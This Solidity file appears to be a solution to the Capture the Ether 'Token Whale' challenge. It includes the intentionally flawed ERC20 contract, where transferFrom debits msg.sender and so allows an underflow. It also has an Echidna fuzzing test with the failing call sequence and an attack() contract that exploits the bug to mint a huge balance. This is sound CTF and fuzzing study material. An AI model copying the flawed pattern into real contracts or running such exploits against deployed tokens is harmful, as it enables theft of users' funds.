// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.4.25;

/** 
 * @notice This ERC20-compatible token is hard to acquire. There’s a fixed supply 
 * of 1,000 tokens, all of which are yours to start with. Find a way to accumulate 
 * at least 1,000,000 tokens to solve this challenge.
 */
contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    constructor(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        // this function subtract value from msg.sender balance that leads to underflow vulnerability
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}

contract TestTokenWhale is TokenWhaleChallenge {
    address echidna = tx.origin;

    constructor() public TokenWhaleChallenge(echidna) {}

    function echidna_test_balance() public view returns (bool) {
        /**
         * Call sequence:
         * 1.approve(0x10000,57468303086598021199669648060485531653701668951548542285997257146456854450127)
         * from: 0x0000000000000000000000000000000000030000
         * 2.transferFrom(0x30000,0x2fffffffd,897) from: 0x0000000000000000000000000000000000010000
         * 3.transfer(0x30000,26060281074011434290781932042249973135790488564433869324155106336482362887317
         * from: 0x0000000000000000000000000000000000010000
         * 
         * comment: sending large value to transfer leads to overflow/underflow
         */
        return !isComplete();
    }
}

contract CaptureTheEther {
    address player;
    TokenWhaleChallenge tokenWhale;

    constructor(address tokenAddress) {
        player = msg.sender;
        tokenWhale = TokenWhaleChallenge(tokenAddress);
    }

    function attack() public {
        // this will increase player balance to 1,500 and balance of this contract will underflow by 500
        tokenWhale.transferFrom(player, player, 500);
        // now transfer balance to player so player balance is 1000000 + 1500
        tokenWhale.transfer(player, 1000000);
        // check if challenge has been completed
        require(tokenWhale.isComplete());
    }
}
